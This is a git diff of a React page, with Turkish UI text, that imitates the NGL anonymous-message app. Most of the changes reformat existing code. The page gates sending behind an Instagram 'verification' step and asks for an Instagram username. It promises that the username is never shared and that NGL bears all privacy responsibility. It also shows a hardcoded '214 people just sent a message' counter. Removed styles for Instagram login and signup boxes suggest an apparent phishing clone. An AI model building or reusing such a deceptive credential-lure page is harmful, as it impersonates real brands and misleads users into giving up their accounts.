@@ -184,205 +184,160 @@ export default function Send() {
             </button>
           )}
 
-          @media (max-width: 450px) {
-          .ig - login - container {
-            width: 100%;
-          padding: 0 16px;
-          box-sizing: border-box;
-          }
-
-          .ig-login-box,
-          .ig-signup-box {
-            border: none;
-          background: transparent;
-          }
-
-          .ig-login-box {
-            padding: 10px 0;
-          }
-
-          .ig-footer {
-            padding: 0 16px;
-          }
-        }
-
-          .nearby-btn {
-            margin - top: 12px;
-          background: rgba(255, 255, 255, 0.2);
-          border: 1px solid rgba(255, 255, 255, 0.4);
-          color: white;
-          padding: 10px 16px;
-          border-radius: 12px;
-          font-weight: 600;
-          cursor: pointer;
-          display: flex;
-          align-items: center;
-          gap: 8px;
-          font-size: 0.9rem;
-          width: 100%;
-          justify-content: center;
-          transition: background 0.2s;
-        }
-          .nearby-btn:hover {
-            background: rgba(255, 255, 255, 0.3);
-        }
-      `}</style>
-    </div >
-  );
-}
+          <div className="gate-security">
             <span>🔒</span>
             <span>Mesaj göndermek için Instagram hesabınla doğrulama yap</span>
-          </div >
-        </motion.div >
+          </div>
+        </motion.div>
       );
     }
 
-// Username prompt (original behavior)
-if (step === 'ig_prompt') {
-  return (
-    <motion.div
-      initial={{ opacity: 0, y: 20 }}
-      animate={{ opacity: 1, y: 0 }}
-      className="ngl-card ig-prompt-card"
-    >
-      <div className="ig-header">
-        <span className="ig-icon">📸</span>
-        <h3>instagram adresini doğrula</h3>
-      </div>
-      <p className="trust-note">
-        mesaj gönderebilmek için instagram kullanıcı adını gir.
-      </p>
-
-      <div className="input-field-group">
-        <span className="at-symbol">@</span>
-        <input
-          type="text"
-          placeholder="instagram kullanıcı adın"
-          value={igUsername}
-          onChange={(e) => setIgUsername(e.target.value)}
-          className="ig-input"
-        />
-      </div>
-
-      <div className="security-guarantee">
-        <div className="guarantee-item">
-          <span className="shield">🛡️</span>
-          <span>kullanıcı adın hiç kimse ile paylaşılmayacaktır.</span>
-        </div>
-        <div className="guarantee-item">
-          <span className="lock">🔒</span>
-          <span>tüm gizlilik sorumluluğu NGL'ye aittir.</span>
-        </div>
-      </div>
-
-      <button
-        className="ngl-button"
-        onClick={handleNextStep}
-        disabled={!igUsername.trim()}
-      >
-        Devam Et
-      </button>
-    </motion.div>
-  );
-}
-
-// Message form
-if (step === 'message') {
-  return (
-    <motion.div
-      initial={{ opacity: 0, scale: 0.9 }}
-      animate={{ opacity: 1, scale: 1 }}
-      className="ngl-card message-card"
-    >
-      <div className="card-header">
-        <div className="avatar">
-          <UserCircle2 size={44} color="#dbdbdb" strokeWidth={1.5} />
-        </div>
-        <div className="header-info">
-          <span className="username">@{targetUser}</span>
-          <span className="tagline">bana anonim olarak mesajlar gönder!</span>
-        </div>
-      </div>
-
-      <div className="question-box">
-        <textarea
-          placeholder="bir şeyler yaz..."
-          value={message}
-          onChange={(e) => setMessage(e.target.value)}
-          maxLength={300}
-        />
-        <button className="pill-dice" onClick={handleDice}><Dices size={24} color="#FF1F7C" /></button>
-      </div>
-
-      <button
-        className="ngl-button"
-        onClick={handleSend}
-        disabled={!message.trim()}
-      >
-        Gönder!
-      </button>
-    </motion.div>
-  );
-}
-
-// Success
-if (step === 'success') {
-  return (
-    <AnimatePresence>
-      <motion.div
-        initial={{ scale: 0.8, opacity: 0 }}
-        animate={{ scale: 1, opacity: 1 }}
-        className="ngl-card success-card"
-      >
-        <div className="success-icon-wrapper">
-          <div className="check-ring">
-            <div className="check-mark">✓</div>
-          </div>
-        </div>
-        <h2>teşekkürler!</h2>
-        <p className="success-sub">mesajın başarıyla iletildi!</p>
-
-        <button className="ngl-button reset-btn" onClick={handleReset}>
-          Bir mesaj daha gönder
-        </button>
-      </motion.div>
-    </AnimatePresence>
-  );
-}
-  };
-
-return (
-  <div className="ngl-container main-bg">
-    <div className="ngl-wrapper">
-      {renderStep()}
-
-      {(step === 'message' || step === 'ig_prompt' || step === 'ig_gate') && (
+    // Username prompt (original behavior)
+    if (step === 'ig_prompt') {
+      return (
         <motion.div
-          initial={{ opacity: 0 }}
-          animate={{ opacity: 1 }}
-          className="footer-elements"
+          initial={{ opacity: 0, y: 20 }}
+          animate={{ opacity: 1, y: 0 }}
+          className="ngl-card ig-prompt-card"
         >
-          <div className="lock-indicator">
-            <span>🔒</span> anonim mesaj gönder
+          <div className="ig-header">
+            <span className="ig-icon">📸</span>
+            <h3>instagram adresini doğrula</h3>
+          </div>
+          <p className="trust-note">
+            mesaj gönderebilmek için instagram kullanıcı adını gir.
+          </p>
+
+          <div className="input-field-group">
+            <span className="at-symbol">@</span>
+            <input
+              type="text"
+              placeholder="instagram kullanıcı adın"
+              value={igUsername}
+              onChange={(e) => setIgUsername(e.target.value)}
+              className="ig-input"
+            />
           </div>
 
-          <div className="story-count">
-            👇 214 kişi az önce mesaj gönderdi 👇
+          <div className="security-guarantee">
+            <div className="guarantee-item">
+              <span className="shield">🛡️</span>
+              <span>kullanıcı adın hiç kimse ile paylaşılmayacaktır.</span>
+            </div>
+            <div className="guarantee-item">
+              <span className="lock">🔒</span>
+              <span>tüm gizlilik sorumluluğu NGL'ye aittir.</span>
+            </div>
           </div>
 
-          <button className="ngl-button app-action">
-            Sen de anonim mesaj gönder!
+          <button
+            className="ngl-button"
+            onClick={handleNextStep}
+            disabled={!igUsername.trim()}
+          >
+            Devam Et
           </button>
         </motion.div>
-      )}
+      );
+    }
 
-      <footer className="page-footer">
-        <a href="#">Terms</a>
-        <a href="#">Privacy</a>
-      </footer>
-    </div>
+    // Message form
+    if (step === 'message') {
+      return (
+        <motion.div
+          initial={{ opacity: 0, scale: 0.9 }}
+          animate={{ opacity: 1, scale: 1 }}
+          className="ngl-card message-card"
+        >
+          <div className="card-header">
+            <div className="avatar">
+              <UserCircle2 size={44} color="#dbdbdb" strokeWidth={1.5} />
+            </div>
+            <div className="header-info">
+              <span className="username">@{targetUser}</span>
+              <span className="tagline">bana anonim olarak mesajlar gönder!</span>
+            </div>
+          </div>
 
-    <style>{`
+          <div className="question-box">
+            <textarea
+              placeholder="bir şeyler yaz..."
+              value={message}
+              onChange={(e) => setMessage(e.target.value)}
+              maxLength={300}
+            />
+            <button className="pill-dice" onClick={handleDice}><Dices size={24} color="#FF1F7C" /></button>
+          </div>
+
+          <button
+            className="ngl-button"
+            onClick={handleSend}
+            disabled={!message.trim()}
+          >
+            Gönder!
+          </button>
+        </motion.div>
+      );
+    }
+
+    // Success
+    if (step === 'success') {
+      return (
+        <AnimatePresence>
+          <motion.div
+            initial={{ scale: 0.8, opacity: 0 }}
+            animate={{ scale: 1, opacity: 1 }}
+            className="ngl-card success-card"
+          >
+            <div className="success-icon-wrapper">
+              <div className="check-ring">
+                <div className="check-mark">✓</div>
+              </div>
+            </div>
+            <h2>teşekkürler!</h2>
+            <p className="success-sub">mesajın başarıyla iletildi!</p>
+
+            <button className="ngl-button reset-btn" onClick={handleReset}>
+              Bir mesaj daha gönder
+            </button>
+          </motion.div>
+        </AnimatePresence>
+      );
+    }
+  };
+
+  return (
+    <div className="ngl-container main-bg">
+      <div className="ngl-wrapper">
+        {renderStep()}
+
+        {(step === 'message' || step === 'ig_prompt' || step === 'ig_gate') && (
+          <motion.div
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            className="footer-elements"
+          >
+            <div className="lock-indicator">
+              <span>🔒</span> anonim mesaj gönder
+            </div>
+
+            <div className="story-count">
+              👇 214 kişi az önce mesaj gönderdi 👇
+            </div>
+
+            <button className="ngl-button app-action">
+              Sen de anonim mesaj gönder!
+            </button>
+          </motion.div>
+        )}
+
+        <footer className="page-footer">
+          <a href="#">Terms</a>
+          <a href="#">Privacy</a>
+        </footer>
+      </div>
+
+      <style>{`
         .main-bg {
           background: linear-gradient(180deg, #FF1F7C 0%, #FF9B42 100%);
           min-height: 100vh;
@@ -463,6 +418,29 @@ return (
           color: #888;
           font-weight: 600;
           justify-content: center;
+        }
+
+        .nearby-btn {
+          margin-top: 5px;
+          margin-bottom: 20px;
+          background: #f0f0f0;
+          color: #555;
+          border: none;
+          padding: 12px 16px;
+          border-radius: 12px;
+          font-weight: 700;
+          cursor: pointer;
+          display: flex;
+          align-items: center;
+          gap: 8px;
+          font-size: 0.9rem;
+          width: 100%;
+          justify-content: center;
+          transition: all 0.2s;
+        }
+        .nearby-btn:hover {
+          background: #e0e0e0;
+          transform: translateY(-1px);
         }
 
         /* Message card */
@@ -631,6 +609,6 @@ return (
         
         .footer-elements { width: 100%; }
       `}</style>
-  </div>
-);
+    </div>
+  );
 }
